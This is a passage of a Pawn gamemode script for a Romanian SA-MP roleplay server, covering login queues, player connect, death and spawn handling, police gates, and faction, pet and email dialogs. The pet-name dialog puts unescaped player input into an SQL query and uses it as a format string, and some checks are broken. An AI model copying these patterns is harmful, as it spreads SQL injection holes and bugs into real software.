			if(s_PlayerInfo[playerid][pSFlyMode])
			{
				SCM(playerid, COLOR_DARKPINK, "Fly mode off.");
				s_PlayerInfo[playerid][pSFlyMode] = 0;

				StopFly(playerid);
				SetPlayerHealthEx(playerid, 100);
				return 1;
			}
		}
		case KEY_LOOK_BEHIND:
		{
			if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
				return Command_ReProcess(playerid, "/engine", 0);
		}
        case KEY_CROUCH:
        {
            if(IsACop(playerid))
            {
                for(new i; i < sizeof gateLocations; ++i)
                {
                    if(PlayerToPoint(15.0, playerid, gateLocations[i][0], gateLocations[i][1], gateLocations[i][2]))
                    {
                        SCMF(playerid, -1, "%d", i);

                        MoveDynamicObject(gateObject[i], gateLocationsMoved[i][0], gateLocationsMoved[i][1], gateLocationsMoved[i][2], gateLocationsMoved[i][3],
                            gateLocationsMoved[i][4], gateLocationsMoved[i][5], gateLocationsMoved[i][6]);

                        SetTimerEx("close_gate", 9000, false, "i", i);
                        return 1;
                    }
                }
                return 1;
            }
       }
	}
	return 1;
}

function close_gate(gateId)
{
    new i = gateId;
    MoveDynamicObject(i, gateLocationsClosed[i][0], gateLocationsClosed[i][1], gateLocationsClosed[i][2], gateLocationsClosed[i][3],
        gateLocationsClosed[i][4], gateLocationsClosed[i][5], gateLocationsClosed[i][6]);

    return 1;
}

/*public OnQueryError(errorid, error[], callback[], query[], connectionHandle)
{
	printf("-- OnQueryError [SQL: %d] --", connectionHandle);
	printf("Error: [%d] %s", errorid, error);
	printf("%s", query);

	if(strlen(callback))
		printf("Callback: %s", callback);

	print("-------------------");

	//sendStaffMessage(STAFF_TYPE_OWNER, COLOR_WARNING, "[ERROR] Update request failed (OnQueryError, %d).", errorid);
	return 1;
}
*/
timer loginPlayerFromQueue[1000]()
{
    if(Iter_Count(playersInLogin) >= MAX_PLAYERS_ON_LOGIN)
    {   
        foreach(new i: playersInQueue)
            va_GameTextForPlayer(i, "~y~%d ~n~ ~w~players in login queue", 1000, 3, Iter_Count(playersInQueue));
        
        return 1;
    }

    while(Iter_Count(playersInLogin) < MAX_PLAYERS_ON_LOGIN && (Iter_Count(playersInQueue) > 0))
    {
        new
            currentQPlayer = Iter_First(playersInQueue);
        
        BanCheck(currentQPlayer);

        Iter_Remove(playersInQueue, currentQPlayer), Iter_Add(playersInLogin, currentQPlayer);
    }

    if(Iter_Count(playersInQueue) == 0) {
        stop timerLoginQueue;
        timerLoginQueue = Timer:-1;
    }
    return 1;
}

public OnPlayerConnect(playerid)
{
    s_PlayerInfo[playerid] = resetStaticEnum;

    LoadPlayerTDs(playerid);

    SetPlayerColor(playerid, COLOR_GREY);
    TogglePlayerSpectating(playerid, true);

    proceed_connect_camera(playerid);

    Iter_Add(playersInQueue, playerid);
    //de rez asta

    if(Iter_Count(playersInQueue) > MAX_PLAYERS_ON_LOGIN && timerLoginQueue == Timer:-1)
        timerLoginQueue = repeat loginPlayerFromQueue(); //start login gen

    if(timerLoginQueue != Timer:-1)
    {
        SCM(playerid, COLOR_RED, "Please wait in login queue.. you'll be logged in soon. Don't quit the game.");
        va_SendClientMessage(playerid, COLOR_RED, "There are %d players in queue.", Iter_Count(playersInQueue));
    }
    else
    {
        BanCheck(playerid);
    }
    return true;
}
static const disconnectReasons[3][] = { 
    {"crash/timeout"}, {"quit"}, {"banned/kicked"}
};

public OnPlayerDisconnect(playerid, reason)
{
	if(s_PlayerInfo[playerid][pSLoggedIn])
	{
		new
			year, month, day, hour, minute, second;

		getdate(year, month, day), gettime(hour, minute, second);

		mysql_format(SQL, gString, sizeof gString, "update `users` set `lastOn` = '%d-%02d-%02d %02d:%02d:%02d', `Status` = '0', `Muted` = '%d', `MuteTime` = '%d',\
        `PaydayTime` = '%d' where `id` = '%d';",
        year, month, day, hour, minute, second, PlayerInfo[playerid][pMuted], PlayerInfo[playerid][pMuteTime], PlayerInfo[playerid][pPaydayTime] - gettime(), PlayerInfo[playerid][pSQLID]);
		mysql_tquery(SQL, gString, "", "");
	}

    if(PlayerInfo[playerid][pWantedLevel])
    {
        if(!Iter_Count(streamedPlayers[playerid]))
            return 1;

        new
            streamCops = 0, streamCop[5], nearFormat[128], jailSeconds = PlayerInfo[playerid][pWantedLevel] * 300,
            suspectBonus = PlayerInfo[playerid][pWantedLevel] * 1000;
        
        foreach(new i : streamedPlayers[playerid])
        {
            if(GetDistanceBetweenPlayers(playerid, i) > 50)
                continue;

            if(!s_PlayerInfo[i][pSOnDuty])
                continue;

            if(factionType[PlayerInfo[i][pMember]] != FACTION_TYPE_POLICE)
                continue;

            if(streamCops >= 5)
                break;

            PlayerPlaySound(i, 1058, 0.0, 0.0, 0.0);
            GameTextForPlayer(i, "Running Suspect bonus!", 5000, 1);

            SCMF(i, COLOR_DBLUE, "Ai primit $%d bonus pentru prinderea suspectului %s.", suspectBonus, GetName(playerid));
            GivePlayerCash(i, suspectBonus);

            streamCop[streamCops] = i;
            streamCops ++;

            // de facut raport
        }

        for(new i; i < streamCops; i++)
            format(nearFormat, sizeof nearFormat, "%s%s%s", nearFormat, GetName(streamCop[i]), (i == streamCops ? ("!") : (", ")));

        ClearCrime(playerid);

        sendNearbyMessage(playerid, COLOR_PURPLE, "* %s is now in jail! Thanks to: %s", GetName(playerid), nearFormat);
        sendDepartmentMessage(1, COLOR_LIGHTBLUE, "Dispatch: %s has been killed by No One and will be in jail for %d second.", GetName(playerid), playerid, jailSeconds);
    }

	if(Iter_Contains(PlayersInVehicle, playerid))
		Iter_Remove(PlayersInVehicle, playerid);

	if(Iter_Contains(sendReport, playerid))
		Iter_Remove(sendReport, playerid);

	if(PlayerInfo[playerid][pMember] > 0)
	{
		SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, 0, "%s from your group has disconnected (%s).", GetName(playerid), disconnectReasons[reason]);

		if(Iter_Contains(FactionMembers<PlayerInfo[playerid][pMember]>, playerid))
        {
            if(IsACop(playerid))
                Iter_Remove(Cops, playerid);

			Iter_Remove(FactionMembers<PlayerInfo[playerid][pMember]>, playerid);
        }
	}
    //updatess
    Update(playerid, pConnectTimex);
    //pUpdateInt(playerid, "ConnectTime", PlayerInfo[playerid][pConnectTime]);
    //
	if(PlayerInfo[playerid][pAdmin] || PlayerInfo[playerid][pHelper])
	{
        if(Iter_Contains(Admins, playerid)) Iter_Remove(Admins, playerid);
        if(Iter_Contains(Helpers, playerid)) Iter_Remove(Helpers, playerid);

        sendStaffMessage(0xcc8e33FF, "QuitBot: %s has left the server (%s).", GetName(playerid), disconnectReasons[reason]);
	}
    if(PlayerInfo[playerid][pPetStatus] == 1 && PlayerInfo[playerid][pPet] == 1) 
        RemovePet(playerid);

    if(Iter_Contains(playersInLogin, playerid)) Iter_Remove(playersInLogin, playerid);
    if(Iter_Contains(playersInQueue, playerid)) Iter_Remove(playersInQueue, playerid);
	return 1;
}
public OnPlayerSpawn(playerid)
{
	sendDebugMessage("[OnPlayerSpawn] %s has spawned. (%d: v:%d|i:%d).", GetName(playerid), playerid, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid));

	if(IsACop(playerid) && s_PlayerInfo[playerid][pSOnDuty])
	{
        SetPlayerArmourEx(playerid, 100);

		GivePlayerWeaponEx(playerid, 3, 1);
		GivePlayerWeaponEx(playerid, 24, 500);
		GivePlayerWeaponEx(playerid, 41, 500);
		GivePlayerWeaponEx(playerid, 29, 1000);
		GivePlayerWeaponEx(playerid, 31, 1000);
	}
	
    SetPlayerSpawn(playerid);
    SetPlayerTeam(playerid, 4);
    SetPlayerToTeamColor(playerid);
    StopAudioStreamForPlayer(playerid);
    SetCameraBehindPlayer(playerid);
    TextDrawShowForPlayer(playerid, Time);
    TextDrawShowForPlayer(playerid, Date);
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
	sendDebugMessage("[OnPlayerDeath] %s has died. (%d: k:%d|r:%d|w:%d)", GetName(playerid), playerid, killerid, reason, PlayerInfo[playerid][pWantedLevel]);
    if(TakingLesson[playerid] == 1 || examcar[playerid] != -1)
    {
        TakingLesson[playerid] = 0;
        DestroyVehicle(examcar[playerid]);
        DisableRemoteVehicleCollisions(playerid, 0);
        examcar[playerid] = -1;
        DisablePlayerRaceCheckpoint(playerid);
        PlayerTextDrawHide(playerid, DMVexam[playerid]);
        PlayerTextDrawHide(playerid, DMVcheck[playerid]);
    }
	if(killerid != INVALID_PLAYER_ID)
	{
        if(!IsACop(killerid) && IsACop(playerid))
        {
            DailyQuestCheck(playerid, QUEST_TYPE_COPS, 1);
        }
		if(PlayerInfo[playerid][pWantedLevel])
		{
			if(!Iter_Count(streamedPlayers[playerid]))
				return 1;

			new
				streamCops = 0, streamCop[5], nearFormat[128], jailSeconds = PlayerInfo[playerid][pWantedLevel] * 300,
                suspectBonus = PlayerInfo[playerid][pWantedLevel] * 1000;
			
			foreach(new i : streamedPlayers[playerid])
			{
				if(GetDistanceBetweenPlayers(playerid, i) > 50)
					continue;

				if(!s_PlayerInfo[i][pSOnDuty])
					continue;

				if(factionType[PlayerInfo[i][pMember]] != FACTION_TYPE_POLICE)
					continue;

				if(streamCops >= 5)
					break;

				PlayerPlaySound(i, 1058, 0.0, 0.0, 0.0);
				GameTextForPlayer(i, "Running Suspect bonus!", 5000, 1);

                SCMF(i, COLOR_DBLUE, "Ai primit $%d bonus pentru prinderea suspectului %s.", suspectBonus, GetName(playerid));
                GivePlayerCash(i, suspectBonus);

				streamCop[streamCops] = i;
				streamCops ++;

				// de facut raport
			}

			for(new i; i < streamCops; i++)
				format(nearFormat, sizeof nearFormat, "%s%s%s", nearFormat, GetName(streamCop[i]), (i == streamCops ? ("!") : (", ")));

            ClearCrime(playerid);

			sendNearbyMessage(playerid, COLOR_PURPLE, "* %s is now in jail! Thanks to: %s", GetName(playerid), nearFormat);
			sendDepartmentMessage(1, COLOR_LIGHTBLUE, "Dispatch: %s died and will be in jail for %d seconds.", GetName(playerid), jailSeconds);

            SCMF(playerid, COLOR_GREY, "Ai fost omorat de catre %s [%d] folosind %s.", GetName(playerid), playerid, GetWeaponNameID(reason));
        }
	}
   	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
	if(!s_PlayerInfo[playerid][pSLoggedIn])
	{
		SCM(playerid, COLOR_LIGHTRED, "** This server requires a Login BEFORE spawn (Kicked) **");
		return KickEx(playerid);
	}
	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
    if(s_PlayerInfo[playerid][pSLoggedIn])
		return SpawnPlayer(playerid);

    return 1;
}

public OnGameModeInit()
{
    Date = TextDrawCreate(577.613342, 8.711090, "--");
    TextDrawLetterSize(Date, 0.334332, 1.463110);
    TextDrawAlignment(Date, 2);
    TextDrawColor(Date, -1);
    TextDrawSetShadow(Date, 0);
    TextDrawSetOutline(Date, 1);
    TextDrawBackgroundColor(Date, 255);
    TextDrawFont(Date, 3);
    TextDrawSetProportional(Date, 1);

    Time = TextDrawCreate(578.226745, 21.570337, "--");
    TextDrawLetterSize(Time, 0.634799, 2.406399);
    TextDrawAlignment(Time, 2);
    TextDrawColor(Time, -1);
    TextDrawSetShadow(Time, 0);
    TextDrawSetOutline(Time, 1);
    TextDrawBackgroundColor(Time, 255);
    TextDrawFont(Time, 3);
    TextDrawSetProportional(Time, 1);

    CreateDynamic3DTextLabel("Driving School!\n \nType /exam to start the vehcile licence test", -1, 1219.3429,-1812.7673,16.5938, 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 100.0);
	database_connect();

    LoadSystems();
    LoadAllDynamicObjects();

	Streamer_ToggleChunkStream(0);

	new
		year, month, day;

	getdate(year, month, day);

	format(gString, sizeof gString, "RPG Romania %d.%02d.%02d", COMMUNITY_YEARS, month, day);
	SetGameModeText(gString);

    AddPlayerClass(0, 0, 0, 0, 1.0, -1, -1, -1, -1, -1, -1);
	UsePlayerPedAnims(), ShowPlayerMarkers(2), AllowInteriorWeapons(1), EnableStuntBonusForAll(0),
	SetNameTagDrawDistance(40), DisableInteriorEnterExits(), LimitPlayerMarkerRadius(5.0);

    new serverTime;

    gettime(serverTime);
    SetWorldTime(serverTime);

    Command_SetDeniedReturn(true);

	ManualVehicleEngineAndLights();

	for(new i; i < MAX_VEHICLES; i++)
		VehicleInfo[i][vehFuel] = 100;

    for(new i; i < MAX_FACTIONS; i++)
    {
        switch(i)
        {
            case 1, 2, 3, 8: factionType[i] = FACTION_TYPE_POLICE;
            case 4, 5, 6, 10: factionType[i] = FACTION_TYPE_GANG;
            default: factionType[i] = FACTION_TYPE_OTHER;
        }
    }

    timerLoginQueue = Timer:-1;
	return 1;
}

// ======== DIALOGS ========

Dialog:DIALOG_CHANGENAME(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    if(isnull(inputtext))
        return sendError(playerid, "Invalid new nickname.");

    if(strlen(inputtext) < 3 && strlen(inputtext) > 25)
        return sendError(playerid, "Invalid new nickname, minimum 3 characters, maximum 25.");

    if(checkAccountFromDatabase(inputtext) != 0) 
        return sendError(playerid, "This name already exist.");

    mysql_real_escape_string(inputtext, gString);
    format(WantName[playerid], MAX_PLAYER_NAME, gString);

    ABroadCast(COLOR_RED, 1, "NameChange: %s (%d) wants to change his/her name to %s. Type /an %d to accept this change.", 1, PlayerInfo[playerid][pNormalName], playerid, WantName[playerid], playerid);
    SCM(playerid, COLOR_YELLOW, "Wait for an admin to accept your change name request.");
    s_PlayerInfo[playerid][pSTypeName] = 2;

    return 1;
}

Dialog:DIALOG_CHANGENAME2(playerid, response, listitem, inputtext[])
{
    if(!response)
        return Dialog_Show(playerid, DIALOG_CHANGENAME2, DIALOG_STYLE_INPUT, "Change name:", "An admin forced you to change your nickname.\n\nPlease enter your desired name below:", "Ok", "Cancel");

    if(isnull(inputtext))
        return Dialog_Show(playerid, DIALOG_CHANGENAME2, DIALOG_STYLE_INPUT, "Change name:", "Invalid new nickname (null).\n\nPlease enter your desired name below:", "Ok", "Cancel");   

    if(strlen(inputtext) < 3 || strlen(inputtext) > 25)
        return Dialog_Show(playerid, DIALOG_CHANGENAME2, DIALOG_STYLE_INPUT, "Change name:", "Invalid new nickname (3-25 characters).\n\nPlease enter your desired name below:", "Ok", "Cancel");

    if(checkAccountFromDatabase(inputtext) != 0) 
        return Dialog_Show(playerid, DIALOG_CHANGENAME2, DIALOG_STYLE_INPUT, "Change name:", "This name already exist.\n\nPlease enter your desired name below:", "Ok", "Cancel");
    
    mysql_real_escape_string(inputtext, gString);
    format(WantName[playerid], MAX_PLAYER_NAME, gString);

    ABroadCast(COLOR_RED, 1, "NameChange: %s (%d) wants to change his/her name to %s. Type /an %d to accept this change.", PlayerInfo[playerid][pNormalName], playerid, WantName[playerid], playerid);
    SCM(playerid, COLOR_YELLOW, "Wait for an admin to accept your change name request.");

    return 1;
}

Dialog:DIALOG_AUNINVITE(playerid, response, listitem, inputtext[])
{
    if(!response)
    {
        DeletePVar(playerid, "au_punishAmount"), DeletePVar(playerid, "au_targetPlayer"),
        DeletePVar(playerid, "au_uninvReason"), DeletePVar(playerid, "au_targetRank"),
        DeletePVar(playerid, "au_targetMember"), DeletePVar(playerid, "au_targetFDays"),
        DeletePVar(playerid, "au_targetId");

        return 1;
    }

    new 
        returnReason[64], targetName[MAX_PLAYER_NAME], stringMessage[256],

        punishAmount = GetPVarInt(playerid, "au_punishAmount"), targetRank = GetPVarInt(playerid, "au_targetRank"),
        targetMember = GetPVarInt(playerid, "au_targetMember"), targetFDays = GetPVarInt(playerid, "au_targetFDays"),
        targetId = GetPVarInt(playerid, "au_targetId");
        
    GetPVarString(playerid, "au_uninvReason", returnReason, sizeof returnReason);
    GetPVarString(playerid, "au_targetPlayer", targetName, MAX_PLAYER_NAME);

    foreach(new i : FactionMembers<targetMember>)
    {
        if(PlayerInfo[i][pSQLID] == targetId)
        {
            SCMF(i, COLOR_GREY, "Ai fost demis de catre administratorul %s din factiunea ta cu %d FP.", PlayerInfo[playerid][pNormalName], punishAmount);

            format(gString, sizeof gString, "Ai fost demis de administratorul %s\n din factiunea din care faceai parte %s (rank %d)\n dupa %d days, cu %d FP. Motiv: %s.", PlayerInfo[playerid][pNormalName], NumeFactiune(targetMember), targetRank, TSToDays(targetFDays), punishAmount, returnReason);
            Dialog_Show(i, 0, DIALOG_STYLE_MSGBOX, "Info", gString, "Ok", "");

            WhenPlayerGotUninvited(i, punishAmount);
            SCM(playerid, -1, "Acest jucator nu este intr-o factiune.");
            break;
        }
    }
    SCMF(playerid, COLOR_LIGHTBLUE, "L-ai dat pe %s afara din factiunea sa %s FP.", targetName, (punishAmount ? va_return("cu %d", punishAmount) : "fara"));

    format(stringMessage, sizeof stringMessage, "%s was uninvited by Admin %s from faction %s (rank %d) after %d days, %s FP. Reason: %s.",
        targetName, PlayerInfo[playerid][pNormalName], NumeFactiune(targetMember), targetRank, TSToDays(targetFDays), (punishAmount ? va_return("with %d", punishAmount) : "without"), returnReason);

    ABroadCast(COLOR_WARNING, 1, stringMessage);
    SendFamilyMessage(targetMember, COLOR_GENANNOUNCE, 0, stringMessage);

    SCMF(playerid, COLOR_GREY, "L-ai demis pe %s din factiunea sa.", targetName);

    format(gString, sizeof gString, "select * from `faction_logs` where `player` = '%d' order by `id` desc limit 1;", targetId);
    new Cache: localQuery = mysql_query(SQL, gString);

    new fhId = cache_get_field_content_int(0, "id");
    mysql_real_escape_string(stringMessage, stringMessage);

    mysql_format(SQL, gString, sizeof gString, "delete from `faction_logs` where `id` = '%d';", fhId);
    mysql_tquery(SQL, gString, "", "");
    
    cache_delete(localQuery);

    mysql_format(SQL, gString, sizeof gString, "insert into `faction_logs` (`text`, `player`, `leader`) values ('%s', '%d', '%d')", stringMessage, targetId, PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gString, "", "");
    
    insertPlayerMail(targetId, gettime(), "Ai fost demis de Admin %s din factiunea din care faceai parte %s (rank %d) dupa %d zile, %s FP. Motiv: %s.", PlayerInfo[playerid][pNormalName], NumeFactiune(targetMember), targetRank, TSToDays(targetFDays), (punishAmount ? va_return("cu %d", punishAmount) : "fara"), returnReason);

    mysql_format(SQL, gString, sizeof gString, "update `users` set `Member` = '0', `Rank` = '0', `FWarn` = '0', `FPunish` = '%d', `FactionJoin` = '0' where `name` = '%s';", punishAmount, targetName);
    mysql_tquery(SQL, gString, "", "");

    DeletePVar(playerid, "au_punishAmount"), DeletePVar(playerid, "au_targetPlayer"),
    DeletePVar(playerid, "au_uninvReason"), DeletePVar(playerid, "au_targetRank"),
    DeletePVar(playerid, "au_targetMember"), DeletePVar(playerid, "au_targetFDays"),
    DeletePVar(playerid, "au_targetId");
    return 1;
}

Dialog:DIALOG_PETSKIN(playerid, response, listitem, inputtext[])
{
    if(!response) return 1;
    switch(listitem) {
        case 0: PlayerInfo[playerid][pPetSkin] = 19079; 
        case 1: PlayerInfo[playerid][pPetSkin] = 1607;
        case 2: PlayerInfo[playerid][pPetSkin] = 1609;
        case 3: PlayerInfo[playerid][pPetSkin] = 1608;
        case 4: PlayerInfo[playerid][pPetSkin] = 1371;
    }
    pUpdateInt(playerid, "PetSkin", PlayerInfo[playerid][pPetSkin]);

    RemovePet(playerid);
    AttachPet(playerid);
    SCM(playerid, COLOR_RED, "[SUCCESS]: {FFFFFF}Modelul animalului tau de companie a fost schimbat.");
    return 1;
}

Dialog:DIALOG_PETNAME(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;
    
    if(!isnull(inputtext))
    {
        if(strlen(inputtext) >= 1 && strlen(inputtext) <= 14)
        {
            format(PlayerInfo[playerid][pPetName], 30, inputtext);
            SCMF(playerid, COLOR_RED, "[SUCCESS]: {FFFFFF}Numele petului tau este acum %s.", inputtext);
            
            mysql_format(SQL, gString, sizeof gString, "update `users` set `PetName` = '%s' where `id` = '%d'", PlayerInfo[playerid][pPetName], PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gString, "", "");

            RemovePet(playerid);
            AttachPet(playerid);
        }
        else {
            format(gString, sizeof gString, "Nume invalid\n Numele trebuie sa contina intre 4 si 12 caractere si nu trebuie sa contina caractere speciale."); 
            Dialog_Show(playerid, DIALOG_PETNAME, DIALOG_STYLE_INPUT, "Change pet name", gString, "Change", "Exit");
        }
    }
    else {
        format(gString, sizeof gString, "Nume invalid\n Numele trebuie sa contina intre 4 si 12 caractere si nu trebuie sa contina caractere speciale."); 
        Dialog_Show(playerid, DIALOG_PETNAME, DIALOG_STYLE_INPUT, "Change pet name", gString, "Change", "Exit");
    }
    return 1;
}
Dialog:DIALOG_PET(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    switch(listitem)
    {
        case 0:
        {
            if(PlayerInfo[playerid][pPetStatus] == 0)
                AttachPet(playerid);
            else
                RemovePet(playerid);
            
            pUpdateInt(playerid, "PetStatus", PlayerInfo[playerid][pPetStatus]);
        }
        case 1:
        {
            format(gString, sizeof gString, "{FF0000}Numele petului tau este: %s\n{FFFFFF}Daca doresti sa-l redenumesti introdu in casuta de mai jos numele dorit:", PlayerInfo[playerid][pPetName]);
            Dialog_Show(playerid, DIALOG_PETNAME, DIALOG_STYLE_INPUT, "Change pet name", gString, "Change", "Exit");
        }
        case 2: ViewPet(playerid);
        case 3: 
        {
            if(PlayerInfo[playerid][pPetLevel] >= 20)
                return SCM(playerid, COLOR_GREY, "You can't upgrade the pet because he have level 20.");

            if(PlayerInfo[playerid][pPetPoints] < PlayerInfo[playerid][pPetLevel] * 100) 
                return SCMF(playerid, COLOR_GREY, "You don't have %d Pet Points. You have only %d Pet Points.", PlayerInfo[playerid][pPetLevel] * 100, PlayerInfo[playerid][pPetPoints]);

            if(GetPlayerCash(playerid) < PlayerInfo[playerid][pPetLevel] * 10000000)
                return SCMF(playerid, COLOR_GREY, "You need %s$ to upgrade the pet.", FormatNumber(PlayerInfo[playerid][pPetLevel] * 10000000));
            
            PlayerInfo[playerid][pPetLevel] ++;

            SCMF(playerid, COLOR_GREY, "Congratulations! Your pet is now of level %d.", PlayerInfo[playerid][pPetLevel]);

            GivePlayerCash(playerid, - PlayerInfo[playerid][pPetLevel] * 10000000);
            PlayerInfo[playerid][pPetPoints] -= PlayerInfo[playerid][pPetLevel] * 100;

            mysql_format(SQL, gString, sizeof gString, "update `users` set `PetPoints` = '%d', `PetLevel` = '%d' where `id` = '%d'", PlayerInfo[playerid][pPetPoints], PlayerInfo[playerid][pPetLevel], PlayerInfo[playerid][pSQLID]);
            mysql_tquery(SQL, gString, "", "");

            return AttachPet(playerid);
        }
        case 4: { Dialog_Show(playerid, DIALOG_PETSKIN, DIALOG_STYLE_TABLIST_HEADERS, "Change pet look", "Name\tModel\nParrot\t19078\nDolphin\t1607\nTurtle\t1609\nShark\t1608\nHippo\t1371", "Change", "Exit"); }
    }
    return 1;
}

Dialog:DIALOG_EMAIL_READ(playerid, response, listitem, inputtext[])
{
    mysql_format(SQL, gString, sizeof gString, "update `emails` set `iReadStatus` = '1' where `id` = '%d';", s_PlayerInfo[playerid][pSDialogItems][s_PlayerInfo[playerid][pSDialogSelected]]);
    mysql_tquery(SQL, gString, "", "");

    if(response)
        return Command_ReProcess(playerid, "/emails", false);

    return 1;
}

Dialog:DIALOG_EMAILS(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;
    
    s_PlayerInfo[playerid][pSDialogSelected] = listitem;

    mysql_format(SQL, gString, sizeof gString, "select `sMessage`, `iTimestamp` from `emails` where `ID` = '%d';", s_PlayerInfo[playerid][pSDialogItems][listitem]);
    mysql_tquery(SQL, gString, "WhenPlayerReadEmail", "ii", playerid, s_PlayerInfo[playerid][pSDialogItems][listitem]);
    return 1;
}

Dialog:DIALOG_MEMBERS(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    if(listitem >= 0)
    {
        if(PlayerInfo[playerid][pRank] >= 6)
        {
            new name[30],result[30],query[300],test[5],strings[300];
            format(query, sizeof(query), "SELECT * FROM `users` WHERE `id` = '%d'",dSelected[playerid][listitem]);
            print(query);
            new Cache: membresult = mysql_query(SQL,query);
            for(new i, j = cache_get_row_count (); i != j; ++i)
            {
                cache_get_field_content(i, "name", result); format(name, 30, result);
                cache_get_field_content(i, "Rank", result); format(test, 5, result);
            }
            cache_delete(membresult);
            MemberSelect[playerid] = dSelected[playerid][listitem];
            format(strings, sizeof(strings),"%s - %s",test,name);
            Dialog_Show(playerid, DIALOG_MEMBERS2, DIALOG_STYLE_LIST, strings, "Change Rank\nFaction Warn\nClear FW\nUninvite - 40 FP\nUninvite - 0 FP", "OK", "Exit");
        }
    }
    return 1;
}

Dialog:DIALOG_MEMBERS2(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    switch(listitem)
    {
        case 0: sendSyntax(playerid, "/changerank [id] [rank]");
        case 1:
        {
            new string1[256],rank;
            if(PlayerInfo[playerid][pSQLID] == MemberSelect[playerid]) return SendClientMessage(playerid, -1, "You can't give a fw to yourself.");
            foreach(new i : FactionMembers<PlayerInfo[playerid][pMember]>)
            {
                if(PlayerInfo[i][pSQLID] == MemberSelect[playerid])
                {
                    if(PlayerInfo[playerid][pRank] == 6 && PlayerInfo[i][pRank] == 7 || PlayerInfo[playerid][pRank] == 6 && PlayerInfo[i][pRank] == 6) return SendClientMessage(playerid, -1, "You can't give a FW to a member with rank 6-7.");
                }
            }
            format(string1, sizeof(string1), "SELECT * FROM `users` WHERE `id` = '%d'",MemberSelect[playerid]);
            new Cache: membresult = mysql_query(SQL,string1);
            for(new i, j = cache_get_row_count (); i != j; ++i)
            {
                rank = cache_get_field_content_int(i, "Rank");
            }
            cache_delete(membresult);
            if(PlayerInfo[playerid][pRank] == 6 && rank == 6 || PlayerInfo[playerid][pRank] == 6 && rank == 7) return SendClientMessage(playerid, -1, "You can't give a FW to a member with rank 6-7.");
            Dialog_Show(playerid, DIALOG_FWARN, DIALOG_STYLE_MSGBOX, "You are sure?", "You are sure to give FW to this member?", "Yes", "No");
        }
        case 2:
        {
            if(PlayerInfo[playerid][pRank] != 7) return SendClientMessage(playerid, -1, "Only leaders have acces to fw clear.");
            Dialog_Show(playerid, DIALOG_FUNWARN, DIALOG_STYLE_MSGBOX, "You are sure?", "You are sure to delete FW from this member?", "Yes", "No");
        }
        case 3:
        {
            if(PlayerInfo[playerid][pRank] != 7) return SendClientMessage(playerid, -1, "Only leaders can uninvite a member.");
            if(PlayerInfo[playerid][pSQLID] == MemberSelect[playerid]) return SendClientMessage(playerid, -1, "You can't uninvite yourself.");
            new stringtotal[500],string1[256],ftime,result[30],name[30],frank;
            format(string1, sizeof(string1), "SELECT * FROM `users` WHERE `id` = '%d'",MemberSelect[playerid]);
            new Cache: membresult = mysql_query(SQL,string1);
            for(new i, j = cache_get_row_count (); i != j; ++i)
            {
                ftime = cache_get_field_content_int(i, "FactionJoin");
                frank = cache_get_field_content_int(i, "Rank");
                cache_get_field_content(i, "name", result); format(name, 30, result);
            }
            cache_delete(membresult);
            if(frank == 7) return SendClientMessage(playerid, -1, "You can't uninvite a leader.");
            format(string1, sizeof(string1),"Esti pe cale sa-i dai uninvite lui %s CU 20 FP.\nAcesta are %d zile in factiune.\nScrie motivul pentru uninvite mai jos:", name, TSToDays(ftime));
            format(stringtotal, sizeof(stringtotal),"Atentie!!! Playerii ce au peste 14 zile se vor da afara fara FP, cu exceptia cazurilor in care acesta incalca regulile factiunii.\n%s", string1);
            Dialog_Show(playerid, DIALOG_FPUNINVITE, DIALOG_STYLE_INPUT, "Uninvite - 20 FP", stringtotal, "Uninvite", "Exit");
        }
        case 4:
        {
            if(PlayerInfo[playerid][pRank] != 7) return SendClientMessage(playerid, -1, "Only leaders can uninvite a member.");
            if(PlayerInfo[playerid][pSQLID] == MemberSelect[playerid]) return SendClientMessage(playerid, -1, "You can't uninvite yourself.");
            new stringtotal[500],string1[256],ftime,result[30],name[30],frank;
            format(string1, sizeof(string1), "SELECT * FROM `users` WHERE `id` = '%d'",MemberSelect[playerid]);
            new Cache: membresult = mysql_query(SQL,string1);
            for(new i, j = cache_get_row_count (); i != j; ++i)
            {
                ftime = cache_get_field_content_int(i, "FactionJoin");
                frank = cache_get_field_content_int(i, "Rank");
                cache_get_field_content(i, "name", result); format(name, 30, result);
            }
            cache_delete(membresult);
            if(frank == 7) return SendClientMessage(playerid, -1, "You can't uninvite a leader.");
            format(string1, sizeof(string1),"Esti pe cale sa-i dai uninvite lui %s FARA FP.\nAcesta are %d zile in factiune.\nScrie motivul pentru uninvite mai jos:", name, TSToDays(ftime));
            format(stringtotal, sizeof(stringtotal),"Atentie!!! Playerii ce au sub 14 zile in factiune se vor da afara cu FP, cu exceptia cazurilor in care un owner iti spune ca e ok sa dai uninvite fara FP.\n%s", string1);
            Dialog_Show(playerid, DIALOG_NOUNINVITE, DIALOG_STYLE_INPUT, "Uninvite - 0 FP", stringtotal, "Uninvite", "Exit");
        }
    }
    return 1;
}

Dialog:DIALOG_FWARN(playerid, response, listitem, inputtext[])
{
    if(!response)
        return 1;

    new str[256],stringg[128],fwarn,name[30],name2[30],result[30],fcttime;
    format(stringg, sizeof(stringg), "SELECT * FROM `users` WHERE `id` = '%d'",MemberSelect[playerid]);
    new Cache: membresult = mysql_query(SQL,stringg);
    for(new i, j = cache_get_row_count (); i != j; ++i)
    {
        //idd = cache_get_field_content_int(i, "id");
        cache_get_field_content(i, "name", result); format(name2, 30, result);
        fwarn = cache_get_field_content_int(i, "FWarn");
        fcttime = cache_get_field_content_int(i, "FactionTime");
    }
    cache_delete(membresult);
    if(fwarn >= 2) return SendClientMessage(playerid, -1, "Poti da maxim 2 FW unui membru, la al 3-lea FW se da uninvite.");
